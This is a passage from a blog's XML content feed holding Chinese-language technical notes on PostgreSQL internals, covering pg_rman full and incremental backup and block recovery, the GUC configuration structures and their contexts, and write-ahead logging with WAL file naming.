      
      <categories>
          
          <category> 工具篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Postgresql rman</title>
      <link href="/2019/08/15/PostgreSQL/2019-07-20-Postgresql-rman/"/>
      <url>/2019/08/15/PostgreSQL/2019-07-20-Postgresql-rman/</url>
      
        <content type="html"><![CDATA[<ul><li>联机程序. 并且目标数据库必须处于归档模式。</li><li>支持在线全备, 增量备份, 归档备份<ul><li>增量备份基于已经存在的一个全库备份</li></ul></li><li>rman 本身使用pg_start_backup(), copy, pg_stop_backup() 备份模式</li></ul><p>本身采用的是文本拷贝…  cp/fwrite;</p><ul><li>pg_start_backup()<ul><li>text 用户定义的标签, 是备份转储文件将被存储的名字</li><li>boolean 指尽快执行pg_start_backup. 这将会强制一个立即执行的检查点, 会导致I/O操作的峰值, 拖慢任何并发执行的查询.</li><li>boolean 如果为false, 则在完成备份后, pg_stop_backup将立即返回，而无需等待WAL归档</li></ul></li><li>pg_stop_backup()</li></ul><p><a href="https://blog.csdn.net/sunansheng/article/details/54893619?d=1568275996946" target="_blank" rel="noopener">差异备份与累计备份</a></p><a id="more"></a><p><strong>rman整体架构</strong></p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-07-20-Postgresql-rman/1564449414429.png?raw=true" alt="1564449414429"></p><p>默认配置参数:</p><ol><li>PGDATA</li><li>BACKUP_PATH</li><li>ARCLOG_PATH</li></ol><p>pg_rman  init</p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-07-20-Postgresql-rman/1564449631751.png?raw=true" alt="1564449631751"></p><p>pg_rman  show </p><p>pg_rman  config –list</p><p>pg_rman  backup -b full</p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-07-20-Postgresql-rman/1564449737711.png?raw=true" alt="1564449737711"></p><p>​                -b inc  [incremental]</p><p>​            <img src="https://github.com/vagabond1132/Picture/blob/master/2019-07-20-Postgresql-rman/1564449766687.png?raw=true" alt="1564449766687"></p><p>​                 </p><p>​            -b arch [archive]</p><p>pg_rman  restore</p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-07-20-Postgresql-rman/1564450036123.png?raw=true" alt="1564450036123"></p><p>[新增功能] pg_rman  blockrecover  –datafile tablespaceOid/databaseOid/relfilenode  –block 0</p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-07-20-Postgresql-rman/1564450128908.png?raw=true" alt="1564450128908"></p><h4 id="备份策略"><a href="#备份策略" class="headerlink" title="备份策略"></a>备份策略</h4><ol><li>恢复窗口:  指定天数. 默认值为 7.</li><li>备份数量:  冗余度保留。  默认值为 1.</li></ol><h3 id="代码组织架构"><a href="#代码组织架构" class="headerlink" title="代码组织架构:"></a>代码组织架构:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── backup.c</span><br><span class="line">├── blockrecover.c</span><br><span class="line">├── catalog.c</span><br><span class="line">├── COPYRIGHT</span><br><span class="line">├── data.c</span><br><span class="line">├── delete.c</span><br><span class="line">├── dir.c</span><br><span class="line">├── docs</span><br><span class="line">├── expected</span><br><span class="line">├── idxpagehdr.h</span><br><span class="line">├── init.c</span><br><span class="line">├── Makefile</span><br><span class="line">├── parray.c</span><br><span class="line">├── parray.h</span><br><span class="line">├── pg_rman.c</span><br><span class="line">├── pg_rman.h</span><br><span class="line">├── pgsql_src</span><br><span class="line">├── pgut</span><br><span class="line">├── README.md</span><br><span class="line">├── restore.c</span><br><span class="line">├── script</span><br><span class="line">├── show.c</span><br><span class="line">├── sql</span><br><span class="line">├── util.c</span><br><span class="line">├── validate.c</span><br><span class="line">└── xlog.c</span><br></pre></td></tr></table></figure><h3 id="pg-rman-源码浅析"><a href="#pg-rman-源码浅析" class="headerlink" title="pg_rman-源码浅析"></a><a href="https://www.showapi.com/book/view/2096/6" target="_blank" rel="noopener">pg_rman-源码浅析</a></h3><p><strong>代码阅读</strong></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">* +----------------+---------------------------------+  </span><br><span class="line">* | PageHeaderData | linp1 linp2 linp3 ...           |  </span><br><span class="line">* +-----------+----+---------------------------------+  </span><br><span class="line">* | ... linpN |                                      |  </span><br><span class="line">* +-----------+--------------------------------------+  </span><br><span class="line">* |               ^ pd_lower                         |  </span><br><span class="line">* |                                                  |  </span><br><span class="line">* |                     v pd_upper                   |  </span><br><span class="line">* +-------------+------------------------------------+  </span><br><span class="line">* |                     | tupleN ...                 |  </span><br><span class="line">* +-------------+------------------+-----------------+  </span><br><span class="line">* |       ... tuple3 tuple2 tuple1 | <span class="string">"special space"</span> |  </span><br><span class="line">* +--------------------------------+-----------------+</span><br></pre></td></tr></table></figure><p>如果有数据刷入, 那么将会做持久化，数据库页头部的pd_lsn表示该数据库页最后一次变化时, 变化产生的REDO在wal file中的结束为止.</p><p>如果wal flush的lsn插入位置 大于或者等于这个pd_lsn将表示这个页的更改是可靠的. 即每次修改都将发生块的变化: 包含LSN的修改.</p><p>即可以通过第一次备份开始时的全局LSN, 以及当前需要备份的数据的Page LSN来判断此页是否发生过修改.</p><p><strong>修改了即备份，没修改不需要备份, 从而实现数据库的块级别增量备份</strong></p><p>增量备份关联代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pgBackupGetPath(prev_backup, prev_file_txt, lengthof(prev_file_txt),</span><br><span class="line">DATABASE_FILE_LIST);</span><br><span class="line">prev_files = dir_read_file_list(pgdata, prev_file_txt);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Do backup only pages having larger LSN than previous backup.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">lsn = &amp;prev_backup-&gt;start_lsn;</span><br><span class="line">xlogid = (uint32) (*lsn &gt;&gt; <span class="number">32</span>);</span><br><span class="line">xrecoff = (uint32) *lsn;</span><br><span class="line">elog(DEBUG, _(<span class="string">"backup only the page updated after LSN(%X/%08X)"</span>),</span><br><span class="line">xlogid, xrecoff);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Construct the directory for this backup within BACKUP_PATH. */</span></span><br><span class="line">pgBackupGetPath(&amp;current, path, lengthof(path), DATABASE_DIR);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Save the files listed above. */</span></span><br><span class="line">backup_files(pgdata, path, files, prev_files, lsn, current.compress_data, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure><p>[新增]块恢复代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (loop = <span class="number">0</span>; loop &lt;= brc.base_index; loop++)</span><br><span class="line">&#123;</span><br><span class="line">backup = (pgBackup *) parray_get(backups, loop);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* don't use incomplete nor different timeline backup */</span></span><br><span class="line"><span class="keyword">if</span> (backup-&gt;status != BACKUP_STATUS_OK || backup-&gt;tli != base_backup-&gt;tli)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="number">-1</span> == brc.lastBackupIndex &amp;&amp; HAVE_ARCLOG(backup) &amp;&amp; brc.last_needed_index &gt;= loop)</span><br><span class="line">&#123;</span><br><span class="line">restore_archive_logs(backup,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* use database backup only */</span></span><br><span class="line"><span class="keyword">if</span> (BACKUP_MODE_INCREMENTAL &gt; backup-&gt;backup_mode || brc.last_needed_index &lt; loop)</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">elog(DEBUG, <span class="string">"found backup BK_KEY: \"%d\" can be used "</span>,backup-&gt;backup_id);</span><br><span class="line"></span><br><span class="line">recoverBackup(backup,loop);</span><br><span class="line">       =&gt;  [[</span><br><span class="line">           <span class="keyword">for</span>(loop = <span class="number">0</span>; loop &lt; brc.rbNum; loop++)</span><br><span class="line">               &#123;</span><br><span class="line">                   <span class="comment">/*If this block has find a page,skip it*/</span></span><br><span class="line">                   <span class="keyword">if</span>(brc.pageArray[loop])</span><br><span class="line">                   &#123;</span><br><span class="line">                       elog(DEBUG,<span class="string">"block \'%u\' has find it's page,skip."</span>,brc.recoverBlock[loop]);</span><br><span class="line">                       <span class="keyword">continue</span>;</span><br><span class="line">                   &#125;</span><br><span class="line">                   page = findPageInBackup(backup, brc.recoverBlock[loop]);</span><br><span class="line">                   <span class="keyword">if</span>(page)</span><br><span class="line">                   &#123;</span><br><span class="line">                       brc.pageArray[loop] = page;</span><br><span class="line">                       <span class="keyword">if</span>(<span class="number">-1</span> == brc.lastBackupIndex)</span><br><span class="line">                       &#123;</span><br><span class="line">                           brc.lastBackupIndex = backupindex;</span><br><span class="line">                           elog(DEBUG,<span class="string">"Find last backup can be used:BK_KEY \'%d\'"</span>,backup-&gt;backup_id);</span><br><span class="line">                       &#125;</span><br><span class="line">                   &#125;</span><br><span class="line">               &#125;</span><br><span class="line">       ]]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="问题"><a href="#问题" class="headerlink" title="问题:"></a>问题:</h4><ol><li>随意增大filenode大小, 即无法整除8192时, 会默认增大一个Page。 此时的Page是不完整的. pg默认不开启checksum校验. 因此Pg会提示blk Num无效, 进行blockrecover操作时, 将会发生无法恢复.  因为整个filenode本身就没有正确的此Page;</li><li>当随意修改Page数据时, 有时会发生显示数据不全，即数据条目与插入条目不符的情况. 此时Pg本身无法正常的数据异常告警. 请开启checksum. 进行验证.</li></ol><p>checkSum异常告警;</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WARNING:  <span class="number">01000</span>: page verification failed, calculated checksum <span class="number">11654</span> but expected <span class="number">8293</span></span><br></pre></td></tr></table></figure><ol><li>确定table的tuple Num</li><li>确定table的page Num</li></ol><p><strong>确保开启checksum功能, 保证Page的数据正常.</strong>  但对上述问题不产生有效影响;;</p>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Postgresql Guc</title>
      <link href="/2019/08/12/PostgreSQL/2019-08-12-Postgresql-GUC/"/>
      <url>/2019/08/12/PostgreSQL/2019-08-12-Postgresql-GUC/</url>
      
        <content type="html"><![CDATA[<blockquote><p>  GUC: Grand Unified Configuration 指的是postgreSQL数据库的一种对数据库变量进行设置对数据库进行控制的机制。通常理解是对postgresql.conf文件中变量进行修改，或通过set命令对参数进行设置。但实际上GUC变量的种类，设置方法要更加复杂多样。在guc.h和guc.c中可以看到GUC变量的详细实现。</p></blockquote><a id="more"></a><h4 id="Guc相关结构"><a href="#Guc相关结构" class="headerlink" title="Guc相关结构"></a>Guc相关结构</h4><ol><li><p>bool</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">config_bool</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">config_generic</span> <span class="title">gen</span>;</span></span><br><span class="line"><span class="comment">/* constant fields, must be set correctly in initial value: */</span></span><br><span class="line"><span class="keyword">bool</span>   *variable;</span><br><span class="line"><span class="keyword">bool</span>boot_val;</span><br><span class="line">GucBoolCheckHook check_hook;</span><br><span class="line">GucBoolAssignHook assign_hook;</span><br><span class="line">GucShowHook show_hook;</span><br><span class="line"><span class="comment">/* variable fields, initialized at runtime: */</span></span><br><span class="line"><span class="keyword">bool</span>reset_val;</span><br><span class="line"><span class="keyword">void</span>   *reset_extra;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>int</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">config_int</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">config_generic</span> <span class="title">gen</span>;</span></span><br><span class="line"><span class="comment">/* constant fields, must be set correctly in initial value: */</span></span><br><span class="line"><span class="keyword">int</span>   *variable;</span><br><span class="line"><span class="keyword">int</span>boot_val;</span><br><span class="line"><span class="keyword">int</span>min;</span><br><span class="line"><span class="keyword">int</span>max;</span><br><span class="line">GucIntCheckHook check_hook;</span><br><span class="line">GucIntAssignHook assign_hook;</span><br><span class="line">GucShowHook show_hook;</span><br><span class="line"><span class="comment">/* variable fields, initialized at runtime: */</span></span><br><span class="line"><span class="keyword">int</span>reset_val;</span><br><span class="line"><span class="keyword">void</span>   *reset_extra;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>real</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">config_real</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">config_generic</span> <span class="title">gen</span>;</span></span><br><span class="line"><span class="comment">/* constant fields, must be set correctly in initial value: */</span></span><br><span class="line"><span class="keyword">double</span>   *variable;</span><br><span class="line"><span class="keyword">double</span>boot_val;</span><br><span class="line"><span class="keyword">double</span>min;</span><br><span class="line"><span class="keyword">double</span>max;</span><br><span class="line">GucRealCheckHook check_hook;</span><br><span class="line">GucRealAssignHook assign_hook;</span><br><span class="line">GucShowHook show_hook;</span><br><span class="line"><span class="comment">/* variable fields, initialized at runtime: */</span></span><br><span class="line"><span class="keyword">double</span>reset_val;</span><br><span class="line"><span class="keyword">void</span>   *reset_extra;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>string</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">config_string</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">config_generic</span> <span class="title">gen</span>;</span></span><br><span class="line"><span class="comment">/* constant fields, must be set correctly in initial value: */</span></span><br><span class="line"><span class="keyword">char</span>  **variable;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> *boot_val;</span><br><span class="line">GucStringCheckHook check_hook;</span><br><span class="line">GucStringAssignHook assign_hook;</span><br><span class="line">GucShowHook show_hook;</span><br><span class="line"><span class="comment">/* variable fields, initialized at runtime: */</span></span><br><span class="line"><span class="keyword">char</span>   *reset_val;</span><br><span class="line"><span class="keyword">void</span>   *reset_extra;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li><li><p>enum</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">config_enum</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">config_generic</span> <span class="title">gen</span>;</span></span><br><span class="line"><span class="comment">/* constant fields, must be set correctly in initial value: */</span></span><br><span class="line"><span class="keyword">int</span>   *variable;</span><br><span class="line"><span class="keyword">int</span>boot_val;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">config_enum_entry</span> *<span class="title">options</span>;</span></span><br><span class="line">GucEnumCheckHook check_hook;</span><br><span class="line">GucEnumAssignHook assign_hook;</span><br><span class="line">GucShowHook show_hook;</span><br><span class="line"><span class="comment">/* variable fields, initialized at runtime: */</span></span><br><span class="line"><span class="keyword">int</span>reset_val;</span><br><span class="line"><span class="keyword">void</span>   *reset_extra;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><p>每一个类型建立一个对应的静态数组. 用于存储相应的Guc类型  <code>src/backend/utils/misc/guc.c</code></p><p><img src="https://github.com/vagabond1132/Picture/blob/master/2019-08-12-Postgresql-GUC/1565589409242.png?raw=true" alt="1565589409242"></p><h4 id="Guc作用上下文"><a href="#Guc作用上下文" class="headerlink" title="Guc作用上下文:"></a>Guc作用上下文:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span></span><br><span class="line">&#123;</span><br><span class="line">PGC_INTERNAL,</span><br><span class="line">PGC_POSTMASTER,</span><br><span class="line">PGC_SIGHUP,</span><br><span class="line">PGC_SU_BACKEND,</span><br><span class="line">PGC_BACKEND,</span><br><span class="line">PGC_SUSET,</span><br><span class="line">PGC_USERSET</span><br><span class="line">&#125; GucContext;</span><br></pre></td></tr></table></figure><ol><li>Internal 无法被用户修改, 只能被内部进程设置, show 命令能查看此类变量, 通常在编译时设置与改变.</li><li>Postmaster在postmaster进程启动时通过读取configure文件或命令行来设置。 这类变量的改变在postgresql重启时生效.</li><li>Sighup在postmaster进程启动或向postmaster 或backend进程发sighup信号来读取configure文件时设置.</li><li>Backend在新的backend进程启动时读取configure文件生效.</li><li>Suset 指超级用户修改生效, 不需要重新读取configure文件.</li><li>User 指普通用户修改生效, 在当前会话下有效, 无需读取configure文件.</li></ol><h4 id="Guc-分组"><a href="#Guc-分组" class="headerlink" title="Guc 分组"></a>Guc 分组</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> config_group</span><br><span class="line">&#123;</span><br><span class="line">UNGROUPED,</span><br><span class="line">FILE_LOCATIONS,</span><br><span class="line">CONN_AUTH,</span><br><span class="line">CONN_AUTH_SETTINGS,</span><br><span class="line">CONN_AUTH_SECURITY,</span><br><span class="line">RESOURCES,</span><br><span class="line">RESOURCES_MEM,</span><br><span class="line">RESOURCES_DISK,</span><br><span class="line">RESOURCES_KERNEL,</span><br><span class="line">RESOURCES_VACUUM_DELAY,</span><br><span class="line">RESOURCES_BGWRITER,</span><br><span class="line">RESOURCES_ASYNCHRONOUS,</span><br><span class="line">WAL,</span><br><span class="line">WAL_SETTINGS,</span><br><span class="line">WAL_CHECKPOINTS,</span><br><span class="line">WAL_ARCHIVING,</span><br><span class="line">REPLICATION,</span><br><span class="line">REPLICATION_SENDING,</span><br><span class="line">REPLICATION_MASTER,</span><br><span class="line">REPLICATION_STANDBY,</span><br><span class="line">REPLICATION_SUBSCRIBERS,</span><br><span class="line">QUERY_TUNING,</span><br><span class="line">QUERY_TUNING_METHOD,</span><br><span class="line">QUERY_TUNING_COST,</span><br><span class="line">QUERY_TUNING_GEQO,</span><br><span class="line">QUERY_TUNING_OTHER,</span><br><span class="line">LOGGING,</span><br><span class="line">LOGGING_WHERE,</span><br><span class="line">LOGGING_WHEN,</span><br><span class="line">LOGGING_WHAT,</span><br><span class="line">PROCESS_TITLE,</span><br><span class="line">STATS,</span><br><span class="line">STATS_MONITORING,</span><br><span class="line">STATS_COLLECTOR,</span><br><span class="line">AUTOVACUUM,</span><br><span class="line">CLIENT_CONN,</span><br><span class="line">CLIENT_CONN_STATEMENT,</span><br><span class="line">CLIENT_CONN_LOCALE,</span><br><span class="line">CLIENT_CONN_PRELOAD,</span><br><span class="line">CLIENT_CONN_OTHER,</span><br><span class="line">LOCK_MANAGEMENT,</span><br><span class="line">COMPAT_OPTIONS,</span><br><span class="line">COMPAT_OPTIONS_PREVIOUS,</span><br><span class="line">COMPAT_OPTIONS_CLIENT,</span><br><span class="line">ERROR_HANDLING_OPTIONS,</span><br><span class="line">PRESET_OPTIONS,</span><br><span class="line">CUSTOM_OPTIONS,</span><br><span class="line">DEVELOPER_OPTIONS</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>保存命令</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alter system set military_sensitive_data = <span class="string">'0'</span>;</span><br></pre></td></tr></table></figure><p>将会把参数刷出到磁盘文件<code>postgresql.auto.conf</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Do not edit this file manually!</span></span><br><span class="line"><span class="comment"># It will be overwritten by the ALTER SYSTEM command.</span></span><br><span class="line">military_sensitive_data = <span class="string">'0'</span></span><br></pre></td></tr></table></figure><h4 id="Guc变量分析"><a href="#Guc变量分析" class="headerlink" title="Guc变量分析"></a>Guc变量分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&#123;<span class="string">"lc_numeric"</span>, PGC_USERSET, CLIENT_CONN_LOCALE,</span><br><span class="line">gettext_noop(<span class="string">"Sets the locale for formatting numbers."</span>),</span><br><span class="line"><span class="literal">NULL</span></span><br><span class="line">&#125;,</span><br><span class="line">&amp;locale_numeric,</span><br><span class="line"><span class="string">"C"</span>,</span><br><span class="line">check_locale_numeric, assign_locale_numeric, <span class="literal">NULL</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><ol><li></li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span></span><br><span class="line">check_locale_numeric(<span class="keyword">char</span> **newval, <span class="keyword">void</span> **extra, GucSource source)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> check_locale(LC_NUMERIC, *newval, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Database </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Database </tag>
            
            <tag> Postgresql </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Postgresql Wal</title>
      <link href="/2019/07/19/PostgreSQL/2019-07-19-Postgresql-WAL/"/>
      <url>/2019/07/19/PostgreSQL/2019-07-19-Postgresql-WAL/</url>
      
        <content type="html"><![CDATA[<h4 id="unde-amp-redo"><a href="#unde-amp-redo" class="headerlink" title="unde &amp; redo"></a>unde &amp; redo</h4><p>undo – 回滚;</p><p>redo – 前滚恢复: 发生崩溃时, 进行数据恢复, 通过已存在的预写式日志(WAL)来重新恢复数据库.</p><a id="more"></a><h4 id="Wal"><a href="#Wal" class="headerlink" title="Wal"></a>Wal</h4><p>预写式日志(WAL)是保证数据完整性的一种标准方法。 </p><p>​    WAL的中心概念是数据文件(存储表 和 索引) 的修改[select操作并不会被记录]必须在这些动作被日志记录之后才会被写入, 即在<strong>描述这些改变的日志记录被刷到持久存储</strong>以后。</p><p>​    因此我们不需要在每个事务提交时刷写数据页面到磁盘，因为我们知道发生崩溃时可以通过日志来恢复数据库。任何还没有被应用到数据页面的改变可以根据其日志记录进行重做。即前滚恢复。</p><p>如果数据库在异步提交和事务WAL记录写入之间的风险窗口期间崩溃，在该事务期间所作的修改将丢失。</p><p>后台进程(“WAL写进程”)每wal_writer_delay毫秒就会把未写入的wal记录刷写到磁盘。</p><p>风险窗口实际的最大持续时间是 wal_writer_delay的3倍，因为wal写进程被设计成倾向于在忙时一次写入所有页面。</p><p>commit_delay    Sets the delay in microseconds between transaction commit and flushing WAL to disk.; </p><h4 id="wal段-文件命令组成"><a href="#wal段-文件命令组成" class="headerlink" title="wal段: 文件命令组成:"></a>wal段: 文件命令组成:</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XLogFilePath(path, tli, logSegNo)\</span></span><br><span class="line"><span class="built_in">snprintf</span>(path, MAXPGPATH, XLOGDIR <span class="string">"/%08X%08X%08X"</span>, tli,\</span><br><span class="line"> (uint32) ((logSegNo) / XLogSegmentsPerXLogId),\</span><br><span class="line"> (uint32) ((logSegNo) % XLogSegmentsPerXLogId))</span><br></pre></td></tr></table></figure><p>组成共 3 * 8 =&gt; 24位;</p><p>分别由 ThisTimeLineID, logSegNo / XLogSegmentsPerXLogId, logSegNo % XLogSegmentsPerXLogId.</p><p>构成;</p><p>时间线:  从1开始,接收到ArchiveRecoveryRequested [.conf 存在归档恢复] 时， findNewestTimeline + 1; </p><p>logSegNo: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 